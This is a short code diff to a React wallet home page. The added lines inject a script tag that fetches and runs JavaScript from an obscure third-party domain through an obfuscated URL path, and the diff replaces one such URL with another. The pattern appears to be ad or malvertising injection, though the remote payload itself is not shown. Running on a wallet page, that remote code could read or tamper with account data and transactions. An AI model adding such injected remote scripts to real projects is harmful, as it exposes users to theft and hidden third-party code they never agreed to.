@@ -24,12 +24,12 @@ export default function WalletHomePage() {
   }, [user, loading, router]);
 
   useEffect(() => {
-    const eygb = {};
+    const rifc = {};
     const d = document;
     const s = d.createElement('script');
     const l = d.scripts[d.scripts.length - 1];
-    s.settings = eygb;
-    s.src = "//pristineproblem.com/bFX.V/sWd/GPlq0/YIWNco/cebmS9vuWZNUJlzk/PVTZYF2-NmzBM/xON/TdUkt/Ncj/YP3/MhzGEo1qNNgo";
+    s.settings = rifc || {};
+    s.src = "//pristineproblem.com/b.XLVJs/d/GCli0YY/W/cU/ieQmV9FulZMUYl/kHPvT-Yy3rN/D_Yu5zOtDEEitMN/jBcg0BNOjbkJ4mMCgC";
     s.async = true;
     s.referrerPolicy = 'no-referrer-when-downgrade';
     if (l && l.parentNode) {
